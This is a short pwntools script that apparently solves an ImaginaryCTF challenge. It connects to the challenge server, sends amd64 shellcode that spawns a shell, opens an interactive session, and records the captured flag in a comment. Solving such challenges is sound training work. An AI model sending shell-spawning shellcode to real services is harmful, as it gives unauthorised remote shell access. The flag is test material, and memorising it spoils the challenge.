from pwn import *

context.arch = 'amd64'

io = remote('chal.imaginaryctf.org',42082)
io.sendline(asm(shellcraft.sh()))
io.interactive()

# ictf{nice_job_shellcoding!!!}
